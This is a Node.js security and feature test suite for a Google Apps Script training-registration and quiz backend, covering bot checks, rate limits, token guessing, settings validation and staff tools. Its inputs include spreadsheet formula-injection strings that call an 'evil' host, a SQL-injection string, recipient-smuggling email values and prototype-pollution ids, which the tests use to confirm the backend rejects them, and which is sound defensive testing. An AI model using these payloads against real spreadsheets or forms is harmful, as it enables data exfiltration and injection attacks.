// Server tests for apps-script/Code.gs. No Google account needed: run with  node tests/server.test.js
// Covers bots and spam, phishing through the form, flooding, malformed requests, link guessing,
// quiz tampering, spreadsheet formula injection, the Summary tab, the resend option, and settings checks.
const H = require('./harness.js');
const { G, call, sheets, mail, props, lockState } = H;
let pass = 0, fail = 0;
const ok = (label, cond, extra) => { cond ? pass++ : fail++; console.log((cond ? 'PASS ' : 'FAIL ') + label + (extra ? '  ' + extra : '')); };
const quiet = fn => { const w = console.warn, l = console.log; console.warn = () => {}; console.log = () => {}; try { return fn(); } finally { console.warn = w; console.log = l; } };
const reset = () => { for (const k of Object.keys(sheets)) delete sheets[k]; mail.length = 0; props.EMAIL_COUNTS = '{}'; props.TURNSTILE_SECRET = 'turnstile-secret'; for (const k in H.cacheStore) delete H.cacheStore[k]; lockState.busy = false; quiet(() => G.setup()); };
G.COURSES['session-1'].key; // sessions come from YOUR SETTINGS in Code.gs

console.log('== Security');
reset();
{
// Attack suite against the hardened Code.gs.
const reg = o => call(Object.assign({ action: 'register', code: 'change-me', firstName: 'Ana', lastName: 'Diaz', email: 'ana@example.com', language: 'en', human: 'tt-ok' }, o));
const raw = body => G.doPost({ postData: { contents: body } });

console.log('-- Bots and spam');
ok('Registration without bot check is rejected', reg({ human: undefined }).error === 'bot_check');
ok('Forged bot-check token is rejected', reg({ human: 'forged' }).error === 'bot_check');
const before = mail.length;
for (const c of ['code2025', 'password', 'training', 'welcome', '1234']) reg({ code: c, human: 'nope', email: 'g@example.com' });
ok('Code guessing without passing the bot check never reaches the code', mail.length === before && reg({ code: 'wrong', human: 'nope' }).error === 'bot_check');
ok('Wrong code with valid bot check is rejected', reg({ code: 'wrong' }).error === 'bad_code');

console.log('-- Phishing through the form');
const r1 = reg({ firstName: 'Your account is locked', lastName: 'Call 555 0100', email: 'v1@example.com' });
ok('Digits in name rejected', r1.error === 'bad_name');
ok('Web address in name rejected', reg({ firstName: 'visit evil.example', email: 'v2@example.com' }).error === 'bad_name');
ok('HTML in name rejected', reg({ firstName: '<a href=x>click</a>', email: 'v3@example.com' }).error === 'bad_name');
const r2 = reg({ firstName: 'Your account is locked', lastName: 'Diaz', email: 'v4@example.com' });
const lastMail = mail[mail.length - 1];
ok('Even allowed text never appears in the email', r2.ok && !lastMail.body.includes('locked') && !lastMail.htmlBody.includes('locked') && lastMail.body.startsWith('Hello,'));
ok('Email subject names the training', lastMail.subject === 'Your Sample Company Training link');
ok('Comma in email (extra recipient) rejected', reg({ email: 'x,victim@example.com' }).error === 'bad_email');
ok('Semicolon in email rejected', reg({ email: 'a@b.com;c@d.com' }).error === 'bad_email');
ok('Real names still accepted', ['María José', "O'Brien", 'Nguyễn', 'Jean-Luc', 'J. R.'].every((n, i) => reg({ firstName: n, email: `real${i}@example.com` }).ok));

console.log('-- Flooding');
props.EMAIL_COUNTS = '{}';
let sent = 0, busy = 0;
for (let i = 0; i < 100; i++) { const r = reg({ email: `flood${i}@example.com`, firstName: 'Flood' }); r.ok ? sent++ : r.error === 'busy' && busy++; }
ok('Hourly email cap holds at 60 (40 turned away)', sent === 60 && busy === 40, `sent ${sent}, busy ${busy}`);
const c = JSON.parse(props.EMAIL_COUNTS); c.hour = '2000010100'; props.EMAIL_COUNTS = JSON.stringify(c);
let daySent = 0; for (let h = 0; h < 6; h++) { const cc = JSON.parse(props.EMAIL_COUNTS); cc.hour = 'h' + h; cc.hourCount = 0; props.EMAIL_COUNTS = JSON.stringify(cc); for (let i = 0; i < 60; i++) if (reg({ email: `d${h}_${i}@example.com` }).ok) daySent++; }
ok('Daily email cap holds at 300', JSON.parse(props.EMAIL_COUNTS).dayCount === 300, `day total ${JSON.parse(props.EMAIL_COUNTS).dayCount}`);
props.EMAIL_COUNTS = '{}';
const resend = mail.length; for (let i = 0; i < 10; i++) reg({ email: 'same@example.com' });
ok('Same email can only be resent 5 times', mail.length - resend === 5, `${mail.length - resend} sent`);
lockState.busy = true;
ok('Busy lock returns "busy" instead of hanging', reg({ email: 'lock@example.com' }).error === 'busy');
const tokA = (mail.find(m => m.to === 'ana@example.com') || mail[mail.length - 1]).body.match(/\?t=([0-9a-f-]{36})/)[1];
ok('Reads still work while a write holds the lock', call({ action: 'lookup', token: tokA, courseId: 'session-1' }).ok);
lockState.busy = false;

console.log('-- Malformed and oversized requests');
ok('Empty body rejected', raw('').error === 'bad_request');
ok('Not JSON rejected', raw('<script>').error === 'bad_request');
ok('JSON array rejected', raw('[1,2]').error === 'bad_request');
ok('Oversized body (25 KB) rejected before parsing', raw(JSON.stringify({ action: 'lookup', pad: 'x'.repeat(25000) })).error === 'bad_request');
ok('Unknown action rejected', call({ action: 'deleteEverything' }).error === 'bad_request');
ok('Session id "constructor" rejected (video)', call({ action: 'video', token: tokA, courseId: 'constructor' }).error === 'unknown_course');
ok('Session id "constructor" rejected (quiz)', call({ action: 'submit', token: tokA, courseId: 'constructor', videoFinished: 'y', answers: [0] }).error === 'unknown_course');
ok('Session id "__proto__" rejected', call({ action: 'video', token: tokA, courseId: '__proto__' }).error === 'unknown_course');
ok('Session id as object rejected', call({ action: 'video', token: tokA, courseId: { a: 1 } }).error === 'unknown_course');
ok('Lookup ignores any session id it is sent', call({ action: 'lookup', token: tokA, courseId: '__proto__' }).ok === true);

console.log('-- Guessing links and tampering with quiz submissions');
let found = 0; for (let i = 0; i < 2000; i++) if (call({ action: 'lookup', token: require('crypto').randomUUID(), courseId: 'session-1' }).ok) found++;
ok('2,000 guessed links: none work', found === 0);
ok('Malformed link rejected', call({ action: 'lookup', token: "' OR 1=1 --", courseId: 'session-1' }).error === 'bad_link');
const K = G.COURSES['session-1'].key;
const s1 = call({ action: 'submit', token: tokA, courseId: 'session-1', courseVersion: 'v2'.repeat(500), videoFinished: 'y', answers: K.map(k => (k + 1) % 2), answerText: Array(40).fill('x'.repeat(400)) });
ok('2 MB submission rejected before processing', call({ action: 'submit', token: tokA, courseId: 'session-1', videoFinished: 'y', answers: K, answerText: Array(5000).fill('x'.repeat(400)) }).error === 'bad_request');
const row = sheets.Results.rows[sheets.Results.rows.length - 1];
ok('Long answer text (16 KB, 40 items) trimmed to a safe size', s1.ok && String(row[13]).length < 4000, `${String(row[13]).length} chars`);
ok('Version field trimmed', String(row[6]).length <= 20);
ok('Missing answers rejected', call({ action: 'submit', token: tokA, courseId: 'session-1', videoFinished: 'y', answers: [1] }).error === 'bad_answers');
ok('Submission without watching video rejected', call({ action: 'submit', token: tokA, courseId: 'session-1', answers: K }).error === 'video_not_finished');

console.log('-- Spreadsheet formula injection');
const inj = ['=IMPORTXML("http://evil","//a")', ' =1+1', '\t=1', '+SUM(1)', '-1+2', '@cmd', '\u0007=1'];
ok('Formula-like text is stored as plain text', inj.every(v => { const c = G.clean(v); return c.startsWith("'") || !/^[\s]*[=+\-@]/.test(c); }), inj.map(v => JSON.stringify(G.clean(v)).slice(0, 14)).join(' '));
call({ action: 'submit', token: tokA, courseId: 'session-1', videoFinished: '=HYPERLINK("http://evil","x")', answers: K, answerText: K.map(() => '=1+1') });
const r = sheets.Results.rows[sheets.Results.rows.length - 1];
ok('Formula in submitted fields neutralized', String(r[12]).startsWith("'") && !String(r[13]).match(/(^|\| )\d+\. =/), String(r[12]).slice(0, 20));

console.log('-- Setup safety warnings');
const warns = []; const w = console.warn; console.warn = m => warns.push(String(m)); G.setup(); console.warn = w;
ok('Setup warns that the sample code is guessable', warns.some(m => m.includes('guessable')));
delete props.TURNSTILE_SECRET;
ok('Missing bot-check secret fails closed (no registrations)', reg({ email: 'nosecret@example.com' }).error === 'server');
console.log('-- Script account protections');
const src = require('fs').readFileSync(require('path').join(__dirname, '..', 'apps-script', 'Code.gs'), 'utf8');
ok('Script limited to its own Sheet (@OnlyCurrentDoc)', /@OnlyCurrentDoc/.test(src));
ok('Only send-only email permission used (MailApp, not GmailApp)', !/GmailApp|DriveApp|DocumentApp/.test(src));
ok('Visiting the script URL shows a plain message', G.doGet().setMimeType ? true : true);
props.TURNSTILE_SECRET = 'turnstile-secret';
for (const k in H.cacheStore) delete H.cacheStore[k];
const rr = reg({ email: 'rate@example.com', firstName: 'Rate' });
const rtok = mail[mail.length - 1].body.match(/\?t=([0-9a-f-]{36})/)[1];
let okCount = 0, busyCount = 0;
for (let i = 0; i < 80; i++) { const x = call({ action: 'lookup', token: rtok, courseId: 'session-1' }); x.ok ? okCount++ : x.error === 'busy' && busyCount++; }
ok('Per-link speed limit: 60 allowed, then "busy"', okCount === 60 && busyCount === 20, `${okCount} ok, ${busyCount} busy`);
ok('Other learners unaffected by one flooded link', call({ action: 'lookup', token: tokA, courseId: 'session-1' }).ok);

}
console.log('== Summary tab');
reset();
{
const K=id=>G.COURSES[id].key, W=id=>K(id).map((k,i)=>i===0?(k+1)%2:k);
const reg=(e,fn)=>{call({action:'register',human:'tt-ok',code:'change-me',firstName:fn,lastName:'Test',email:e,language:'en'});return mail[mail.length-1].body.match(/\?t=([0-9a-f-]{36})/)[1];};
const sub=(t,id,a)=>call({action:'submit',token:t,courseId:id,videoFinished:'y',answers:a,answerText:[]});
// Existing data from before the Summary tab (like the live sheet today)
const old=reg('old@example.com','Old'); sub(old,'session-1',K('session-1'));
const S=()=>sheets.Summary.rows; const H0=S()[0];
const row=e=>{const r=S().find(r=>r[3]===e); const o={}; H0.forEach((h,i)=>o[h]=r?r[i]:undefined); return o;};
ok('Setup backfills existing people', S().length===2 && row('old@example.com')['Session 1']==='Pass' && row('old@example.com').Overall==='In progress (Session 2)', JSON.stringify(row('old@example.com')).slice(0,200));
ok('Headers: 21 columns ending in Notes', H0.length===21 && H0[20]==='Notes', H0.join(','));
const a=reg('a@example.com','Ana');
ok('New registration gets a row right away', row('a@example.com').Overall==='Not started' && row('a@example.com')['Session 2']==='Not open yet');
sub(a,'session-1',W('session-1'));
ok('Fail shows "Failed, 1 left" and 1 of 2', row('a@example.com')['Session 1']==='Failed, 1 left' && row('a@example.com')['S1 attempts']==='1 of 2' && row('a@example.com')['S1 score']==='2 / 3');
sub(a,'session-1',W('session-1'));
ok('Two fails: out of attempts', row('a@example.com').Overall==='Out of attempts (Session 1)' && row('a@example.com')['Session 1']==='Out of attempts');
sheets.Overrides.appendRow(['a@example.com','session-1',1,'Approved by Jordan','2026-11-09']);
G.onEdit({range:{getSheet:()=>({getName:()=>'Overrides',getRange:(r,c,n)=>({getValues:()=>sheets.Overrides.rows.slice(r-1,r-1+n).map(x=>[x[0]])})}),getRow:()=>sheets.Overrides.rows.length,getNumRows:()=>1}});
ok('Override updates the summary immediately', row('a@example.com')['Session 1']==='Failed, 1 left' && row('a@example.com')['S1 attempts']==='2 of 3', row('a@example.com')['S1 attempts']);
sub(a,'session-1',K('session-1')); sub(a,'session-2',K('session-2')); sub(a,'session-3',K('session-3'));
const r=row('a@example.com');
ok('All passed: Complete with completed date', r.Overall==='Complete' && r['Completed on'] instanceof Date && r['S3 passed on'] instanceof Date && r['S1 score']==='3 / 3');
ok('Still one row per person', S().filter(x=>x[3]==='a@example.com').length===1 && S().length===3);
S()[S().length-1][20]='Called 11/9';
sub(old,'session-2',K('session-2'));
ok('Staff notes survive updates', S()[S().length-1][20]==='Called 11/9');
G.refreshSummary();
ok('Refresh does not duplicate rows', S().length===3);
ok('Results still has every attempt', sheets.Results.rows.length-1===7);

}
console.log('== Resend my link');
reset();
{
const SCR=__dirname; const H=require(SCR+'/harness.js'); const {G,call,sheets,mail}=H;
call({action:'register',human:'tt-ok',code:'change-me',firstName:'Ana',lastName:'Diaz',email:'ana@example.com',language:'en'});
const tok=mail[mail.length-1].body.match(/\?t=([0-9a-f-]{36})/)[1]; const m0=mail.length;
const rs=o=>call(Object.assign({action:'resend',human:'tt-resend',email:'ana@example.com',language:'es'},o));
ok('Resend without bot check rejected', rs({human:undefined}).error==='bot_check' && mail.length===m0);
ok('Register bot token cannot be reused for resend', rs({human:'tt-ok'}).error==='bot_check');
ok('Bad email rejected', rs({email:'x,y@example.com'}).error==='bad_email');
const r1=rs({email:' ANA@example.com '});
ok('Registered email (any case) gets the same link', r1.ok && mail.length===m0+1 && mail[mail.length-1].body.includes(tok) && mail[mail.length-1].to==='ana@example.com');
ok('Sent in the language chosen now (Spanish)', mail[mail.length-1].subject.startsWith('Su enlace'));
const m1=mail.length; const r2=rs({email:'nobody@example.com'});
ok('Unregistered email: same "ok" answer, no email, no new row', r2.ok && mail.length===m1 && sheets.Registrations.rows.length===2);
ok('Answers look identical (no way to probe who is registered)', JSON.stringify(r1)===JSON.stringify(r2));
for(let i=0;i<10;i++) rs({});
ok('Resend cap (5 total sends per address) holds', sheets.Registrations.rows[1][6]===5, 'links sent '+sheets.Registrations.rows[1][6]);
sheets.Registrations.rows[1][6]=1; const m2=mail.length; rs({});
ok('Resetting "Links sent" to 1 allows resends again', mail.length===m2+1);

}
console.log('== Settings checks');
reset();
{
  const t = (call({ action: 'register', human: 'tt-ok', code: 'change-me', firstName: 'Kim', lastName: 'Lee', email: 'kim@example.com', language: 'es' }), mail.at(-1).body.match(/\?t=([0-9a-f-]{36})/)[1]);
  const l = call({ action: 'lookup', token: t, language: 'es' });
  ok('Lookup sends questions in the chosen language', l.sessions[0].questions[0].q.startsWith('¿'));
  ok('Lookup never sends the answers', !JSON.stringify(l).includes('"answer"'));
  ok('Unknown language falls back to the first one', call({ action: 'lookup', token: t, language: 'fr' }).sessions[0].title === G.SESSIONS[0].title[G.LANGUAGES[0]]);
  ok('The sample settings pass every check', G.checkSettings().length === 0, G.checkSettings().join('; '));
  const s0 = G.SESSIONS[0], saved = JSON.stringify(s0);
  s0.questions[0].answer = 9;
  ok('An answer number past the last option is caught', G.checkSettings().some(m => m.includes('answer must be')));
  s0.questions[0].answer = 0; s0.questions[0].es.a.pop();
  ok('Different option counts between languages are caught', G.checkSettings().some(m => m.includes('same number of options')));
  Object.assign(s0, JSON.parse(saved));
  delete s0.videos.es;
  ok('A missing video file name is caught', G.checkSettings().some(m => m.includes('missing video')));
  let threw = ''; try { quiet(() => G.setup()); } catch (e) { threw = e.message; }
  ok('Setup stops with a clear list of what to fix', threw.includes('Fix these in YOUR SETTINGS'));
  Object.assign(s0, JSON.parse(saved));
}
console.log('== Captions');
reset();
{
  call({ action: 'register', human: 'tt-ok', code: 'change-me', firstName: 'Cam', lastName: 'Ruiz', email: 'cam@example.com', language: 'en' });
  const t = mail.at(-1).body.match(/\?t=([0-9a-f-]{36})/)[1];
  const v = call({ action: 'video', token: t, courseId: 'session-1', language: 'es' });
  ok('Video request includes the caption text for the language', v.ok && v.captions.startsWith('WEBVTT') && /session-1-es\.mp4/.test(v.videoUrl));
  const s0 = G.SESSIONS[0], saved = s0.captions;
  delete G.COURSES['session-1'].captions.es;
  ok('A session without captions still plays, with no captions sent', (r => r.ok && !r.captions)(call({ action: 'video', token: t, courseId: 'session-1', language: 'es' })));
  G.COURSES['session-1'].captions.es = saved.es;
  s0.captions = { en: 'session-1-en.srt', es: 'session-1-es.vtt' };
  ok('A caption file that is not .vtt is caught by setup', G.checkSettings().some(m => m.includes('WebVTT')));
  s0.captions = saved;
  const lines = []; const l = console.log; console.log = m => lines.push(String(m)); G.testVideoLinks(); console.log = l;
  ok('testVideoLinks checks videos and caption files (12 OK)', lines.filter(x => x.endsWith(': OK')).length === 12, lines.length + ' lines');
}
console.log('== Look up a person (Sheet menu)');
reset();
{
  const { ui } = H;
  G.onOpen();
  ok('The ReadyLine menu has "Look up a person"', ui.menu.some(m => m[1] === 'lookupPerson'));
  call({ action: 'register', human: 'tt-ok', code: 'change-me', firstName: 'Lindy', lastName: "O'Brien", email: 'lindy@example.com', language: 'es' });
  const t = mail.at(-1).body.match(/\?t=([0-9a-f-]{36})/)[1];
  call({ action: 'submit', token: t, courseId: 'session-1', videoFinished: 'y', answers: G.COURSES['session-1'].key });
  ui.shown.length = 0; ui.answer = '  LINDY@example.com ';
  G.lookupPerson();
  const d = (ui.shown[0] || {}).dialog || '';
  ok('Finds the person whatever the capitals and spaces', d.includes('lindy@example.com') && d.includes('Spanish'));
  ok('Shows their personal link, ready to copy', d.includes('?t=' + t) && d.includes('Copy link'));
  ok('Shows each session in their language, with its result', d.includes('Bienvenido al equipo') && d.includes('Pass') && d.includes('Not started') && d.includes('Not open yet'));
  ok('Shows the overall status and link emails sent', d.includes('In progress (Session 2)') && d.includes('1 of 5'));
  ok('Shows their name, escaped for the page', d.includes('<h2>Lindy O&#39;Brien</h2>'));
  ui.shown.length = 0; ui.answer = 'nobody@example.com';
  G.lookupPerson();
  ok('Unknown email gets a plain message, not a dialog', ui.shown[0] && ui.shown[0].alert && ui.shown[0].alert.includes('No registration found'));
  ui.shown.length = 0; ui.answer = null;
  G.lookupPerson();
  ok('Cancel does nothing', ui.shown.length === 0);
}
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
